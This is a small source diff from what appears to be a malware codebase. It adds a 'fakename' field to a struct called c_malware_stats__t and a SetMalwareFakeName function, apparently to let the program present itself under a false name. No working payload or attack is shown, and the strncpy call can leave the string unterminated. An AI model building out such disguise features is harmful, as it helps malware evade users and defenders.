@@ -66,7 +66,8 @@ using		   ::getpid;
 typedef void (*function)(int);
 
 struct  c_malware_stats__t{
-	char   	     name[256];
+	char   	     name[PAMAX];
+	char	     fakename[155];
 
 	size_t       size;
 };
@@ -95,6 +96,9 @@ void cvinit(int argc=0x00, char** argv=NULL){
 }
 void SetMalwareMode(int mode){
 	return;
+}
+void SetMalwareFakeName(const char* name){
+	strncpy(Current.fakename, name, 155);
 }
 void cvexit(int x){
 	exit(x);
